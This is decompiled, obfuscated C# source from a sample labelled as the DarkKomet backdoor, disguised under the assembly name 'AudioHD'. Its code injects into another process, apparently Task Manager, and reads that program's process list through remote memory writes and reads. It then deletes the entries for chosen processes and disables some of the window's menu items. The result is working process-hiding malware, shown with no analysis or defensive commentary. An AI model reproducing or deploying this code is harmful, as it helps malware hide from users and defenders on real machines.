// Decompiled with JetBrains decompiler
// Type: 
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

public static class \u000E
{
  private static bool \u0002;
  private static DateTime \u0003 = DateTime.Now;
  private static int \u0005;
  private static bool \u0008;
  private static ThreadStart \u0006;

  public static void \u0002(Process _param0)
  {
    if (!\u000E.\u0002)
      \u000E.\u0002();
    \u000E.\u0002 obj = new \u000E.\u0002(_param0);
    \u000E.\u0008 = true;
  }

  private static void \u0002()
  {
    if (\u000E.\u0006 == null)
      \u000E.\u0006 = new ThreadStart(\u000E.\u0005);
    new Thread(\u000E.\u0006).Start();
    \u000E.\u0002 = true;
  }

  private static void \u0003()
  {
    try
    {
      IntPtr mainWindowHandle = Process.GetProcessesByName(\u0006\u2002.\u0002(-885874840))[0].MainWindowHandle;
      \u000F.\u0006 structure = new \u000F.\u0006();
      structure.\u0002 = Marshal.SizeOf((object) structure);
      \u000F.GetWindowPlacement(mainWindowHandle, ref structure);
      bool flag1 = structure.\u0005 == 1 || structure.\u0005 == 3;
      IntPtr dlgItem = \u000F.GetDlgItem(\u000F.FindWindowEx(mainWindowHandle, IntPtr.Zero, (string) null, (string) null), 1009);
      IntPtr menu = \u000F.GetMenu(mainWindowHandle);
      IntPtr subMenu1 = \u000F.GetSubMenu(menu, 2);
      IntPtr subMenu2 = \u000F.GetSubMenu(subMenu1, 1);
      uint menuItemId = \u000F.GetMenuItemID(subMenu1, 0);
      if (subMenu2 != IntPtr.Zero)
      {
        \u000F.SendMessage(mainWindowHandle, 273U, (IntPtr) (long) \u000F.GetMenuItemID(subMenu2, 3), IntPtr.Zero);
        \u000F.RemoveMenu(subMenu1, (uint) (int) subMenu2, 1U);
      }
      \u000F.EnableMenuItem(menu, menuItemId, 1U);
      if (flag1)
        \u000F.LockWindowUpdate(dlgItem);
      if ((DateTime.Now - \u000E.\u0003).TotalMilliseconds > 1000.0)
      {
        \u000F.SendMessage(mainWindowHandle, 273U, (IntPtr) (long) menuItemId, IntPtr.Zero);
        \u000E.\u0003 = DateTime.Now;
      }
      GC.Collect();
      int num = (int) \u000F.SendMessage(dlgItem, 4100U, IntPtr.Zero, string.Empty);
      if (num != \u000E.\u0005 || \u000E.\u0008)
      {
        \u000E.\u0008 = false;
        \u000E.\u0005 = num;
        for (int index1 = 0; index1 < num; ++index1)
        {
          string[] strArray = new string[10];
          for (int index2 = 0; index2 < 10; ++index2)
          {
            strArray[index2] = \u000E.\u0002(dlgItem, index1, index2).ToLower();
            if (index2 > 0 && strArray[index2] == strArray[0])
              break;
          }
          foreach (\u000E.\u0002 obj in \u000E.\u0002.\u0002)
          {
            bool flag2 = false;
            bool flag3 = false;
            for (int index3 = 0; index3 < 10 && strArray[index3] != null && (!flag2 || !flag3); ++index3)
            {
              if (strArray[index3].StartsWith(obj.\u0003))
                flag2 = true;
              else if (strArray[index3] == obj.\u0005)
                flag3 = true;
            }
            if (flag2 && flag3)
            {
              \u000F.SendMessage(dlgItem, 4104U, (IntPtr) index1--, IntPtr.Zero);
              --\u000E.\u0005;
              break;
            }
          }
        }
      }
      if (!flag1)
        return;
      \u000F.LockWindowUpdate(IntPtr.Zero);
    }
    catch
    {
    }
  }

  private static string \u0002(IntPtr _param0, int _param1, int _param2)
  {
    \u000F.\u0002 obj = new \u000F.\u0002();
    IntPtr hglobal = Marshal.AllocHGlobal(1024);
    uint num1;
    int windowThreadProcessId = (int) \u000F.GetWindowThreadProcessId(_param0, out num1);
    IntPtr num2 = \u000F.OpenProcess(2035711U, false, (int) num1);
    IntPtr num3 = \u000F.VirtualAllocEx(num2, IntPtr.Zero, 1024U, 4096U, 4U);
    obj.\u0002 = 1U;
    obj.\u0003 = _param1;
    obj.\u0005 = _param2;
    obj.\u000E = (IntPtr) ((int) num3 + Marshal.SizeOf(typeof (\u000F.\u0002)));
    obj.\u000F = 50;
    \u000F.WriteProcessMemory(num2, num3, ref obj, Marshal.SizeOf(typeof (\u000F.\u0002)), 0);
    \u000F.SendMessage(_param0, 4101U, IntPtr.Zero, num3);
    \u000F.ReadProcessMemory(num2, num3, hglobal, 1024, 0);
    string stringAnsi = Marshal.PtrToStringAnsi((IntPtr) ((int) hglobal + Marshal.SizeOf(typeof (\u000F.\u0002))));
    Marshal.FreeHGlobal(hglobal);
    \u000F.VirtualFreeEx(num2, num3, 0, 32768U);
    \u000F.CloseHandle(num2);
    return stringAnsi;
  }

  private static string \u0002(Process _param0)
  {
    foreach (ManagementObject managementObject in new ManagementObjectSearcher(\u0006\u2002.\u0002(-885874850) + (object) _param0.Id).Get())
    {
      string[] args = new string[1]{ string.Empty };
      if (Convert.ToInt32(managementObject.InvokeMethod(\u0006\u2002.\u0002(-885874779), (object[]) args)) == 0)
        return args[0];
    }
    return string.Empty;
  }

  private static void \u0005()
  {
    while (true)
    {
      \u000E.\u0003();
      Thread.Sleep(10);
    }
  }

  private sealed class \u0002
  {
    public static List<\u000E.\u0002> \u0002 = new List<\u000E.\u0002>();
    public string \u0003;
    public string \u0005;

    public \u0002(Process _param1)
    {
      this.\u0003 = _param1.ProcessName.ToLower();
      this.\u0005 = \u000E.\u0002(_param1).ToLower();
      lock (\u000E.\u0002.\u0002)
        \u000E.\u0002.\u0002.Add(this);
    }
  }
}
